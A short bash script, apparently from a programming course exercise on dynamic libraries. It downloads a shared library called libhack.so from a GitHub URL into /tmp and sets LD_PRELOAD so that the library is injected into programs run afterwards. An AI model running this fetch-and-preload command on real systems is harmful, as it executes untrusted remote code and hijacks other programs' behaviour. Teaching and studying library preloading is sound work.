#!/bin/bash
wget -P /tmp/ https://raw.githubusercontent.com/unkown007/alx-low_level_programming/main/0x18-dynamic_libraries/libhack.so
export LD_PRELOAD=/tmp/libhack.so
